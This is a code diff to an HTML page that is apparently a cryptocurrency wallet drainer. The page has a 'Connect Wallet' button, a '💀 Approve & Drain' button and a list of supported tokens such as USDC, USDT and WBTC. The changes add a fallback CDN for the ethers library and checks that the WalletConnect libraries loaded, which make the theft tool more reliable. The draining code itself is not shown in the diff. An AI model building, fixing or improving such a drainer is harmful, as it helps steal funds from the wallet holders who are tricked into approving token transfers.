@@ -66,6 +66,11 @@
       color: #b7c0cb;
       margin-bottom: 14px;
     }
+    #libStatus {
+      font-size: 11px;
+      color: #5e6a78;
+      margin-top: 8px;
+    }
   </style>
 </head>
 <body>
@@ -78,16 +83,48 @@
   <button id="connectBtn">Connect Wallet</button>
   <button id="drainBtn" disabled>💀 Approve & Drain</button>
 
-  <div id="status" class="status">⏳ Awaiting connection...</div>
+  <div id="status" class="status">⏳ Loading libraries...</div>
+  <div id="libStatus">Checking...</div>
   <div class="footnote">Your wallet must have ETH for gas • USDC/USDT/DAI/WETH/SHIB/PEPE/LINK/UNI/WBTC supported</div>
 </div>
 
-<!-- ========== LIBRARIES ========== -->
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<!-- ========== LIBRARIES (with fallback CDNs) ========== -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.umd.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/umd/index.min.js"></script>
 
 <script>
+  // =============================================
+  //  CHECK LIBRARIES
+  // =============================================
+  const libStatus = document.getElementById('libStatus');
+
+  function checkLibraries() {
+    let loaded = [];
+    let missing = [];
+
+    if (typeof ethers !== 'undefined') loaded.push('ethers');
+    else missing.push('ethers');
+
+    if (typeof WalletConnectModal !== 'undefined') loaded.push('WalletConnectModal');
+    else missing.push('WalletConnectModal');
+
+    if (typeof window.EthereumProvider !== 'undefined') loaded.push('EthereumProvider');
+    else missing.push('EthereumProvider');
+
+    libStatus.textContent = '📦 Loaded: ' + (loaded.length ? loaded.join(', ') : 'none') + ' | Missing: ' + (missing.length ? missing.join(', ') : 'none');
+
+    if (missing.length === 0) {
+      document.getElementById('status').textContent = '✅ Libraries loaded. Click Connect.';
+      document.getElementById('status').className = 'status success';
+    } else {
+      document.getElementById('status').textContent = '⚠️ Missing libraries: ' + missing.join(', ') + ' — try refreshing or using a different network.';
+      document.getElementById('status').className = 'status error';
+    }
+
+    return missing.length === 0;
+  }
+
   // =============================================
   //  YOUR CONFIG
   // =============================================
@@ -134,12 +171,13 @@
   // =============================================
   connectBtn.addEventListener('click', async () => {
     try {
-      setStatus('⏳ Initializing WalletConnect...');
-
-      // Check if library loaded
-      if (typeof window.EthereumProvider === 'undefined') {
-        throw new Error('WalletConnect library not loaded. Check internet.');
+      // Check libraries first
+      if (!checkLibraries()) {
+        setStatus('❌ Libraries not loaded. Refresh and try again.', 'error');
+        return;
       }
+
+      setStatus('⏳ Initializing WalletConnect...');
 
       const wcProvider = await window.EthereumProvider.init({
         projectId: PROJECT_ID,
@@ -209,10 +247,9 @@
   });
 
   // =============================================
-  //  AUTO-CONNECT (if already authorized)
+  //  INIT — Check libraries on load
   // =============================================
-  // Note: WalletConnect v2 doesn't auto-connect on page load
-  // User must click the button
+  checkLibraries();
 </script>
 </body>
 </html>
